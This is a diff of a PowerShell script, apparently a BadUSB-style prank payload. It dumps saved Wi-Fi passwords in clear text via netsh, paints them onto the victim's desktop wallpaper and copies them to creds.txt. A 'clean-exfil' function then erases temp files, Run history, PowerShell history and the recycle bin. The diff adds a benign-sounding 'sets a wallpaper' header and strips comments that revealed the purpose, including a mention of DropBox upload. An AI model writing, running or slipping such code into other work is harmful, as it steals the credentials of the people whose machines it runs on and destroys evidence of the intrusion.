@@ -1,8 +1,6 @@
+# This sets a wallpaper on your desktop
 
 $hiddenMessage = "`n`nYou should `ntake care about your `nwindows sessions `n While leaving your computer"
-
-# this will be the name of the image you use as the wallpaper
-
 $ImageName = "dont-let-your-computer-alone"
 
 
@@ -13,8 +11,7 @@ $ImageName = "dont-let-your-computer-alone"
     $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
 
     }
- 
- # If no name is detected function will return $null to avoid sapi speak
+
 
     # Write Error is just for troubleshooting 
     catch {Write-Error "No name was detected" 
@@ -58,10 +55,6 @@ function Get-GeoLocation{
     } 
 
 }
-
-#$GL = Get-GeoLocation
-#if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
-
 
 #############################################################################################################################################
 
@@ -145,14 +138,13 @@ $WLANProfileObjects =@()
 #Bind the WLAN profile names and also the password to a custom object
 Foreach($WLANProfileName in $WLANProfileNames){
 
-    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
+  
     try{
         $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
     }Catch{
         $WLANProfilePassword = "The password is not stored in this profile"
     }
 
-    #Build the object and add this to an array
     $WLANProfileObject = New-Object PSCustomobject 
     $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
     $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
@@ -162,13 +154,10 @@ Foreach($WLANProfileName in $WLANProfileNames){
     if (!$WLANProfileObjects) { Write-Host "variable is null" 
     }else { 
 
-	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage
-
 	echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $Env:temp\foo.txt
 
 $content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
 	}
-#############################################################################################################################################
 
 Add-Type @"
 using System;
@@ -182,7 +171,6 @@ $hdc = [PInvoke]::GetDC([IntPtr]::Zero)
 $w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
 $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
 
-#############################################################################################################################################
 
 Add-Type -AssemblyName System.Drawing
 
@@ -197,36 +185,13 @@ $graphics.DrawString($content,$font,$brushFg,500,100)
 $graphics.Dispose() 
 $bmp.Save($filename) 
 
-# Invoke-Item $filename 
-
-#############################################################################################################################################
-
 echo $hiddenMessage > $Env:temp\foo.txt
 cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
 copy $Env:temp\foo.txt $Env:userprofile\creds.txt
 rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
-
-#############################################################################################################################################
-
 Function Set-WallPaper {
  
-<#
- 
-    .SYNOPSIS
-    Applies a specified wallpaper to the current user's desktop
-    
-    .PARAMETER Image
-    Provide the exact path to the image
- 
-    .PARAMETER Style
-    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
-  
-    .EXAMPLE
-    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
-    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
-  
-#>
 
  
 param (
@@ -286,25 +251,14 @@ public class Params
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 
-#----------------------------------------------------------------------------------------------------
 
 function clean-exfil {
 
 try {
-# Delete contents of Temp folder 
 
 	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
 	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
 	Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
 	Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 	}
